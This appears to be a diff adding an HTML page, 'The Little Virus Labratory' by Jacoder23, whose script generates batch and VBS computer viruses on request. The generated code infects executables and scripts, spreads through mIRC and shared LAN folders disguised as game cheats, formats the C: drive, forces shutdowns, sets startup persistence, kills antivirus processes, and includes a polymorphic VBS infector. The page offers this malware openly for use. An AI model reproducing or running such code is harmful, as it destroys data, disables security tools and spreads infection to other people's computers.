@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<head>
+<title>The Little Virus Labratory 2.0 Beta</title>
+<meta name="description" content="TL Virus Laboratory creates computer viruses for your use on the go! Grab a byte or two and let the magic of virus writing flow through your keyboard!" />
+<meta name="keywords" content="computer virus, jacoder23, computer, hack, how to hack, The Little Virus Labratory" />
+<meta name="author" content="Jacoder23">
+</head>
+<body bgcolor = "black">
+<font face = "Consolas">
+<font color = "00FF00">
+<h1><img src="TLVL.png" alt="I'm a logo!" width="5%" height="5%"> The Little Virus Labratory 2.0 Beta By Jacoder23</h1>
+<p id="virusCode"></p>
+<script>
+function batchVirus(){
+	var vtemp = prompt("Will it be a TinyTrojan, SmallTrojan, Appending or Companion Virus? (Type the first letter of your choice)");
+	vtemp = vtemp.toLowerCase();
+	vtemp = vtemp.split("");
+	vtemp = vtemp[0];
+	var msg = "";
+	var shutdown = confirm("Do you want the infected computer to shut down when the virus file is opened?");
+	if(shutdown === true){
+		shutdown = "<br>shutdown /s /f /t 23 /c";
+		msg = prompt("Do you want a message when the shutdown happens? If so type it in the box below, otherwise press the button labeled cancel.");
+		if(msg === false){
+			msg = "";
+		} else {
+			msg = " \"" + msg + "\"";
+		}
+	} else {
+		shutdown = "";
+	}
+	var mirc = confirm("Do you want the virus to spread through mIRC (if on infected computer)?");
+	if(mirc === true){
+		mirc = "<br>copy %0 %windir%\\learnProgrammingIn5Min.bat" +"<br>%c% [script] > irc.bat" +"<br>%c% n1=if ($nick == $me) { halt } >> irc.bat" +"<br>%c% n2=/dcc send $nick " +'"%windir%\\learnProgrammingIn5Min.bat"' + ">> irc.bat" +"<br>%c% n3=} >> irc.bat" +"<br>if exist c:\\mIRC\\script.ini copy irc.bat c:\\mIRC\\script.ini<br>if exist %programfiles%\\mIRC\\script.ini copy irc.bat %programfiles%\\mIRC\\script.ini<br>del irc.bat > nul";
+	} else {
+		mirc = "";
+	}
+	var lan = confirm("How about LAN?");
+	if(lan === true){
+		lan =   "<br>md %programfiles%\\sharex\\crackz\\ > nul<br>copy %0 %programfiles%\\sharex\\xxx\\xxxlist.bat > nul<br>copy %0 %programfiles%\\sharex\\crackz\\css_xwallhack.bat > nul<br>echo put the css_xwallhack.bat in your ccs dic and start it, happy fragging :) > %programfiles%\\sharex\\crackz\\cssource_wallhack.txt<br>echo start xxxlist.bat and enjoy ;) > %programfiles%\\sharex\\xxx\\xxxftplist.txt<br>net share xxx&crackz=%programfiles%\\sharex > nul";
+	} else {
+		lan = "";
+	}
+	var format = confirm("Do you want to format the hard drive of the infected computer?");
+	if(format === true){
+		format = "<br>format c:";
+	} else {
+		format = "";
+	}
+	var autostart = confirm("Do you want the virus to infect Autostart(Only works on DOS, Windows 95 and Windows 98?)");
+	if(autostart === true){
+		autostart = "<br>copy %0<br>\"C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\win.bat\" > nul\<br>copy %0<br>\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\win.bat\" > nul";
+	} else {
+		autostart = "";
+	}
+	var antiAntiVirus = confirm("Do you want the virus to attempt to delete the victim's antivirus/es(if there are antiviruses of course)?");
+	if(antiAntiVirus === true){
+		antiAntiVirus = "<br>set t=tskill" +"<br>%t% norton*" +"<br>%t% av*" +"<br>%t% avast" +"<br>%t% fire*" +"<br>%t% anti*" +"<br>%t% spy*" +"<br>%t% bullguard" +"<br>%t% PersFw" +"<br>%t% KAV*" +"<br>%t% ZONEALARM" +"<br>%t% SAFEWEB" +"<br>%t% OUTPOST" +"<br>%t% nv*" +"<br>%t% nav*" +"<br>%t% F-*" +"<br>%t% ESAFE" +"<br>%t% cle" +"<br>%t% BLACKICE" +"<br>%t% def*";
+	} else {
+		antiAntiVirus = "";
+	}
+	alert("Here you go! :) Bye!\n\nPS: Don't forget these must be saved in a .bat file!\nPPS: Remove the comments to save file space \"Or just remove the lines that start with REM\"");
+	if(vtemp === "c") {
+		document.getElementById("virusCode").innerHTML = "<br>" + "Here's your virus!" + "<br>" + "<br>" + "--------------------------------Code-------------------------------" + "<br>" + "@echo off " + autostart + antiAntiVirus + "<br>ctty nul " + "<br>" + "rem  ______________________________________________________________ " + "<br>" + "rem :Here is your little virus based on the Wagner Virus by Black Wolf http://bit.ly/23gWMeB :This virus can be cured simply by typing \"attrib -h -r *.*\" in " + "<br>" + "rem :infected directories and deleting BAT files that are identical " + "<br>" + "rem :to this code, then rename the files having a \"V\" at the start " + "<br>" + "rem :to their original names.   NOTE: Does not infect COMMAND.COM. " + "<br>" + "rem :______________________________________________________________ " + "<br>" + "rem The " + virusname + " by " + name + "<br>" + "rem The Little Virus Labratory [Jacoder23]<br>" + "for %%f in (*.exe *.com) do set A=%%f " + "<br>" + "if %A%==COMMAND.COM set A= " + "<br>" + "rename %A% V%A% " + "<br>" + "if not exist V%A% goto end " + "<br>" + "attrib +h V%A% " + "<br>" + "copy %0.bat %A% " + "<br>" + "attrib +r %A% " + "<br>" + "ren %A% *.bat \nset A= " + "<br>" + ":end " + "<br>" + "ctty con " + "<br>" + "@if exist V%0.com V%0.com %1 %2 %3 " + "<br>" + "@if exist V%0.exe V%0.exe %1 %2 %3" + "<br>"+ lan + mirc + format + shutdown + msg + "<br>----------------------------End of Code----------------------------";
+	} else if(vtemp === "a") {
+		document.getElementById("virusCode").innerHTML = "<br>Here's your virus!<br><br>" + "--------------------------------Code-------------------------------<br>@echo off" + autostart + antiAntiVirus + "rem It's based of the very simple _! Virus<br>rem The " + virusname + " by " + name + "<br>rem The Little Virus Labratory [Jacoder23]<br> @ctty nul._!<br>for %%a in (*.bat ..\*.bat) do set _!=%%a<br>find \"_!\"<%_!%<br>if errorlevel 1 find \"_!\"<%0.BAT>>%_!%<br>ctty con._!<br>" + lan + mirc + format + shutdown + msg + "<br>----------------------------End of Code----------------------------";
+	} else if(vtemp === "s") {
+		document.getElementById("virusCode").innerHTML = "<br>Here's your virus!<br><br>" + "--------------------------------Code-------------------------------<br>@echo off" + autostart + antiAntiVirus + lan + mirc +"<br>echo echo Ctrl-er >> C:\autoexec.bat<br>%0<br>" + format + shutdown + msg + "<br>----------------------------End of Code----------------------------";
+	} else {
+		document.getElementById("virusCode").innerHTML = "<br>Here's your virus!<br><br>" + "--------------------------------Code-------------------------------<br>@echo off<br>" + autostart + antiAntiVirus + "<br>rem The " + virusname + " by " + name + "<br>rem The Little Virus Labratory [Jacoder23]<br>" + lan + mirc + format + shutdown + msg + "<br>----------------------------End of Code----------------------------";
+	}
+}
+function vbsVirus(){
+	var vtemp = prompt("Will it be a Appending, Companion or Polymorphic Virus? (Type the first letter of your choice)");
+	vtemp = vtemp.toLowerCase();
+	vtemp = vtemp.split("");
+	vtemp = vtemp[0];
+	alert("Here you go! :) Bye!\n\nPS: Don't forget these must be saved in a VBS file! You can remove the comments too if you want.");
+	if(vtemp === "a") {
+		document.getElementById("virusCode").innerHTML = "set fso = createobject(\"scripting.filesystemobject\")<br>set folder = fso.getfolder(\"C:\ \")<br>For Each file in folder.files<br>If fso.GetExtensionName(file.path)=\"bat\" or fso.GetExtensionName(file.path)=\"Cmd\" then <br>'The " + virusname + " by " + name + "<br>set a= fso.OpenTextFile(file.path,2) <br>'Made with The Little Virus Laboratory - Jacoder23<br>a.writeline \"FOR %%U in (*.vbs) do copy \"&Wscript.Scriptfullname&\" %%U\"<br>a.close<br>End if<br>next"
+	} else if(vtemp === "p") {
+		document.getElementById("virusCode").innerHTML = "'The " + virusname + " by " + name + "<br>'Made with The Little Virus Laboratory - Jacoder23<br><br> Const cbForReading = 1 , cbForWriting = 2<br><br> Randomize<br> <br> cbWePath = Wscript . ScriptFullName<br> <br> Set cbFSO = CreateObject ( \"Scripting.FileSystemObject\" )<br> <br> Set cbWeFile = cbFSO . OpenTextFile ( cbWePath , cbForReading )<br> cbWeCode = cbWeFile . ReadAll<br> cbWeFile . Close<br> <br> cbVirusSize = InStr ( 3 , cbWeCode , \"*****\" & \"*****\" ) + 10 + 1<br><br> Set cbWeFile = cbFSO . OpenTextFile ( cbWePath , cbForReading )<br> cbWeCode = cbWeFile . Read ( cbVirusSize )<br> cbWeFile . Close<br> <br> For Each cbFile In cbFSO . GetFolder ( \".\" ) . Files<br> <br>   If LCase ( cbFSO . GetExtensionName ( cbFile . Name ) ) = Chr ( 118 ) & Chr ( 98 ) & Chr ( 115 ) Then<br> <br>     Set cbVictimFile = cbFSO . OpenTextFile ( cbFile . Path , cbForReading )<br>     cbInfectionMarker = cbVictimFile . Read ( 11 )<br>     cbVictimFile . Close<br> <br>     If cbInfectionMarker <> \"'*****\" & \"*****\" Then<br><br>       Set cbVictimFile = cbFSO . OpenTextFile ( cbFile . Path , cbForReading )<br>       cbVictimCode = cbVictimFile . ReadAll<br>       cbVictimFile . Close<br> <br>       cbVictimCode = cbMutate ( cbWeCode ) & cbVictimCode<br> <br>       Set cbVictimFile = cbFSO . OpenTextFile ( cbFile . Path , cbForWriting , 1 )<br>       cbVictimFile . Write cbVictimCode<br>       cbVictimFile . Close<br> <br>     End If<br> <br>   End If<br> <br> Next<br> <br> <br> Function cbMutate ( cbString )<br> <br>   cbNewString = \"\"<br>   cbI = 1<br> <br>   While cbI <= Len ( cbString )<br> <br>     If Mid ( cbString , cbI , 1 ) = Chr ( 32 ) Then<br><br>       For cbJ = 1 to Int ( 5 * Rnd ) + 1<br><br>         cbNewString = cbNewString + Chr ( 32 )<br><br>       Next<br> <br>         Do<br> <br>           cbI = cbI + 1<br> <br>         Loop While Mid ( cbString , cbI , 1 ) = Chr ( 32 )<br> <br>     Else<br> <br>       If Int ( 2 * Rnd ) + 1 = 1 Then<br><br>         cbNewString = cbNewString + UCase ( Mid ( cbString , cbI , 1 ) )<br><br>       Else<br><br>         cbNewString = cbNewString + LCase ( Mid ( cbString , cbI , 1 ) )<br><br>       End If<br><br>       cbI = cbI + 1<br> <br>     End If<br> <br>   Wend<br> <br>   cbMutate = cbNewString<br> <br> End Function<br> <br>"
+	} else {
+		document.getElementById("virusCode").innerHTML = "'The " + virusname + " by " + name + "<br>'Made with The Little Virus Laboratory - Jacoder23<br>mvbswe.regwrite \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32\" , \"C:\windows\system32.vbs\" 'write for startup<br>set fso = createobject(\"Scripting.filesystemobject\")<br>set folder = fso.getfolder(\"C:\")<br>For Each file in folder.files 'for each file in C:\<br>If fso.GetExtensionName(file.path)=\"txt\" then \'if textfile<br>  renfile = mid(file.name,1,len(file.name)-3)&\"txt\" \'file to be renamed<br>  bathelp = file.path & \".bat\" \'help from batch<br>  Set makebat = Fso.Createtextfile(bathelp, True) \'make it<br>  makebat.writeline \"Attrib +h \" & file.path \'hide true file<br>  makebat.writeline \"ren \" & file.path & \" \" & renfile \'rename<br>  makebat.Close<br>set ws=CreateObject(\"WScript.Shell\")<br>  ws.run bathelp \'run it<br>  Fso.Deletefile bathelp<br>fso.Copyfile Wscript.Scriptfullname,file.path & \".vbs\"<br>end if<br>next"
+	}
+}
+alert("Welcome to The Little Virus Labratory or TLVL for short!");
+var name = prompt("What is your name young one?");
+alert("Very good, " + name + "!");
+var virusname = prompt("Now what shall we name your little pet?");
+alert(virusname + ", it is then!");
+var vlang = prompt("Should it be in Batch (more customisable) or VBS? (more powerful) (Type the first letter of your choice)");
+vlang = vlang.toLowerCase();
+vlang = vlang.split("");
+vlang = vlang[0];
+if(vlang === "b") {
+	batchVirus();
+} else if(vlang === "v"){
+	vbsVirus();
+} else {
+	batchVirus();
+}
+</script>
+<hr>
+<h3>Please send me an email about bugs you encounter and you will be listed here!</h3>
+<h4><br>My email: tcpooljacob@gmail.com</h4>
+<br>
+<h2>IMPORTANT! If TLVL doesn't work and I haven't updated it, Open it again in another tab/window/browser. If it doesn't work send me the details.</h2>
+<hr>
+<script id="dsq-count-scr" src="//veryviralviruslab.disqus.com/count.js" async></script>
+<div id="disqus_thread"></div>
+<div id="disqus_thread"></div>
+<script>
+/**
+* RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+* LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+*/
+var disqus_config = function () {
+this.page.url = "http://jacoder23.neocities.org/index.html"; // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = "TLVL"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+
+s.src = '//veryviralviruslab.disqus.com/embed.js';
+
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+</body>
+</html>
